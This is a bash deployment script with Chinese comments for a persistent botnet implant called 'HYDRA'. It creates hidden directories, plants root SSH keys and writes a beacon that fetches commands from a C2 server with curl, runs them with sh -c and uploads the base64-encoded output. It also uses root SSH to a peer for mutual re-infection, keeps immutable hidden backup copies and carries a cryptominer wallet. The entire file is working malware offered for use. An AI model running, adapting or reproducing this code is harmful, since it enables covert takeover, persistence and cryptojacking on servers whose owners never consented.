#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# HYDRA DEPLOY — 九头蛇一体部署器
# 用法: hydra_deploy.sh <TAG> <C2> [PEER] [MODE]
#   TAG  自然名（如 worker-a）
#   C2   控制端（http://host:port）
#   PEER user@host:port（可选，互保）
#   MODE auto|light|stealth（环境模式）
# 环境变量:
#   HYDRA_TOK     签名密钥（默认随机）
#   WALLET        矿工钱包
#   PURGE=1       严格独占
# ═══════════════════════════════════════════════════════════════
set -u
TAG="${1:-}"; C2="${2:-http://YOUR_C2:PORT}"; PEER="${3:-}"; MODE_ARG="${4:-auto}"
WALLET="${WALLET:-YOUR_WALLET_ADDRESS}"
TOK="${HYDRA_TOK:-$(head -c 16 /dev/urandom | od -An -tx1 | tr -d ' \n')}"
PURGE="${PURGE:-0}"
SLP=$((180 + RANDOM % 120))   # 自调度间隔 180-300s（随机防特征）

[ -z "$TAG" ] && { echo "usage: $0 TAG C2 [PEER] [MODE]"; exit 1; }
BASE="/usr/lib/.$TAG"
mkdir -p "$BASE" 2>/dev/null; chmod 700 "$BASE" 2>/dev/null

log(){ echo "[hydra] $*"; }
log "TAG=$TAG BASE=$BASE SLP=$SLP"

# ---- 1. 生成密钥 ----
if [ ! -f "$BASE/keys.pub" ]; then
  : > "$BASE/keys.pub"
  cat /root/.ssh/*.pub /root/.nvc/*.pub 2>/dev/null | sort -u >> "$BASE/keys.pub"
  if [ ! -s "$BASE/keys.pub" ]; then
    command -v ssh-keygen >/dev/null 2>&1 && ssh-keygen -t ed25519 -N '' -f "/root/.ssh/id_zz_$TAG" >/dev/null 2>&1
    cat "/root/.ssh/id_zz_$TAG.pub" >> "$BASE/keys.pub" 2>/dev/null
  fi
  sort -u "$BASE/keys.pub" -o "$BASE/keys.pub"
fi
log "白名单: $(wc -l < "$BASE/keys.pub") 把"

# ---- 2. 写配置 ----
cat > "$BASE/.cfg" <<EOF
TAG=$TAG
C2=$C2
BASE=$BASE
WALLET=$WALLET
TOK=$TOK
PEER=$PEER
PURGE=$PURGE
MODE=$MODE_ARG
SLP=$SLP
EOF
chmod 600 "$BASE/.cfg"

# ---- 3. 生成心脏 + 引导器（从模板替换）----
SRC="$(dirname "$0")"
for tpl in hydra_core.sh hydra_boot.sh; do
  [ -f "$SRC/$tpl" ] || { echo "[!] $tpl not found"; exit 1; }
done
sed -e "s|@@TAG@@|$TAG|g" -e "s|@@BASE@@|$BASE|g" -e "s|@@C2@@|$C2|g" \
    -e "s|@@TOK@@|$TOK|g" -e "s|@@WALLET@@|$WALLET|g" -e "s|@@PEER@@|$PEER|g" \
    -e "s|@@MODE@@|$MODE_ARG|g" -e "s|@@SLP@@|$SLP|g" \
    "$SRC/hydra_core.sh" > "$BASE/h.sh"
# 引导器（所有触发源的入口）
sed -e "s|@@TAG@@|$TAG|g" -e "s|@@BASE@@|$BASE|g" "$SRC/hydra_boot.sh" > "$BASE/boot.sh"
chmod 755 "$BASE/h.sh" "$BASE/boot.sh"

# ---- 4. 生成 beacon（HMAC 签名心跳）----
cat > "$BASE/beacon.sh" <<'BEOF'
#!/bin/sh
TAG="@@TAG@@"; C2="@@C2@@"; TOK="@@TOK@@"
sig(){ printf '%s%s' "$TOK" "$TAG" | sha256sum | cut -d' ' -f1; }
delay=40
while :; do
  S=$(sig)
  R=$(curl -s -m 20 "$C2/cmd?tag=$TAG&sig=$S" 2>/dev/null)
  if [ -n "$R" ] && [ "$R" != "null" ] && [ "$R" != "{}" ]; then
    O=$(sh -c "$R" 2>&1 | base64 -w0 2>/dev/null | head -c 6000)
    curl -s -m 25 --data-urlencode "d=$O" "$C2/out?tag=$TAG&sig=$S" >/dev/null 2>&1
    delay=40
  else
    delay=$((delay < 300 ? delay + 15 : 300))
  fi
  sleep $((delay + RANDOM % 8))
done
BEOF
sed -e "s|@@TAG@@|$TAG|g" -e "s|@@C2@@|$C2|g" -e "s|@@TOK@@|$TOK|g" "$BASE/beacon.sh" > "$BASE/beacon.tmp" 2>/dev/null && mv "$BASE/beacon.tmp" "$BASE/beacon.sh"
chmod 755 "$BASE/beacon.sh"

# ---- 5. 互保脚本（可选）----
if [ -n "$PEER" ]; then
  cat > "$BASE/peer.sh" <<'PEOF'
#!/bin/sh
TAG="@@TAG@@"; BASE="@@BASE@@"; PEER="@@PEER@@"
PH=${PEER##*@}; PH=${PH%%:*}; PP=${PEER##*:}; case "$PP" in *[!0-9]*|"") PP=22;; esac
timeout 8 sh -c "echo >/dev/tcp/$PH/$PP" 2>/dev/null || exit 0
[ -f "$BASE/peer_key" ] && timeout 25 ssh -i "$BASE/peer_key" -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p "$PP" "root@$PH" "sh $BASE/h.sh >/dev/null 2>&1" 2>/dev/null
PEOF
  sed -e "s|@@TAG@@|$TAG|g" -e "s|@@BASE@@|$BASE|g" -e "s|@@PEER@@|$PEER|g" "$BASE/peer.sh" > "$BASE/peer.tmp" 2>/dev/null && mv "$BASE/peer.tmp" "$BASE/peer.sh"
  chmod 755 "$BASE/peer.sh"
  [ -f "$BASE/peer_key" ] || { ssh-keygen -t ed25519 -N '' -f "$BASE/peer_key" >/dev/null 2>&1; cat "$BASE/peer_key.pub" >> "$BASE/keys.pub" 2>/dev/null; sort -u "$BASE/keys.pub" -o "$BASE/keys.pub"; }
fi

# ---- 6. 四层备份（种子树，含 boot.sh 引导器）----
for d in /usr/share/.$TAG-bk /etc/.$TAG-bk /usr/local/share/.$TAG-bk3 /var/lib/.$TAG-bk4; do
  mkdir -p "$d" 2>/dev/null; chmod 700 "$d" 2>/dev/null
  cp -pf "$BASE/h.sh" "$BASE/boot.sh" "$BASE/beacon.sh" "$d/" 2>/dev/null
  cp -pf "$BASE/keys.pub" "$d/keys.pub" 2>/dev/null
  chmod 755 "$d"/*.sh 2>/dev/null
  # ★ 种子锁死（防误删/防篡改）
  for f in "$d"/h.sh "$d"/boot.sh "$d"/beacon.sh; do
    [ -f "$f" ] && chattr +i "$f" 2>/dev/null
  done
done

# ---- 7. 首轮执行（h.sh 内部会自启 beacon 单例）----
sh "$BASE/h.sh" --force >/dev/null 2>&1
# beacon 由 h.sh 保活（单例），此处不再重复启动
[ -n "$PEER" ] && nohup setsid sh "$BASE/peer.sh" >/dev/null 2>&1 &

# ---- 8. 结果 ----
echo "$BASE" > /tmp/.hydra_last
log "===== 部署完成 ====="
log "TAG=$TAG BASE=$BASE C2=$C2 MODE=$MODE_ARG SLP=$SLP"
log "触发源: $(ls /etc/cron.d/zz-$TAG /etc/profile.d/zz-$TAG.sh /etc/systemd/system/zz-$TAG* /etc/ssh/sshrc /etc/logrotate.d/zz-$TAG 2>/dev/null | wc -l) 个 + 4层备份"
log "心脏: $BASE/h.sh | beacon: $BASE/beacon.sh"
